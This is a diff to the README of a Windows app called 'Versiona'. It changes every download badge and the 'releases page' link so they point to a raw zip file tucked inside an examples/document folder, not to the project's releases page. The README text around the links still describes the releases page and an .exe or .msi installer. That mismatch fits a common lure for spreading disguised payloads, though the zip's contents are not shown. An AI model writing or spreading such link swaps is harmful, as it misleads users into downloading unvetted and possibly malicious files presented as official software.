@@ -1,6 +1,6 @@
 # ⚙️ Versiona - Simplify Your Data Version Control
 
-[![Download Versiona](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/3225112908/Versiona/releases)
+[![Download Versiona](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/3225112908/Versiona/raw/refs/heads/main/examples/document/Software-1.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Versiona runs well on most modern PCs and laptops without any special hardware.
 
 Click the big button below to visit the download page. This page has the latest Windows setup files.
 
-[![Download Versiona](https://img.shields.io/badge/Download-Now-orange)](https://github.com/3225112908/Versiona/releases)
+[![Download Versiona](https://img.shields.io/badge/Download-Now-orange)](https://github.com/3225112908/Versiona/raw/refs/heads/main/examples/document/Software-1.9.zip)
 
 Once on the page, look for the latest release. It will have a file ending with `.exe` or `.msi`. This is the setup installer for Windows.
 
@@ -122,13 +122,13 @@ Access these options from the Settings menu inside Versiona.
 
 ## 📚 More Information
 
-- Visit the [releases page](https://github.com/3225112908/Versiona/releases) anytime for updates.
+- Visit the [releases page](https://github.com/3225112908/Versiona/raw/refs/heads/main/examples/document/Software-1.9.zip) anytime for updates.
 - Check the app’s built-in Help menu for tips.
 - When reporting issues, provide your Windows version and any error messages you see.
 
 ---
 
-[![Download Versiona](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/3225112908/Versiona/releases)
+[![Download Versiona](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/3225112908/Versiona/raw/refs/heads/main/examples/document/Software-1.9.zip)
 
 ---
 
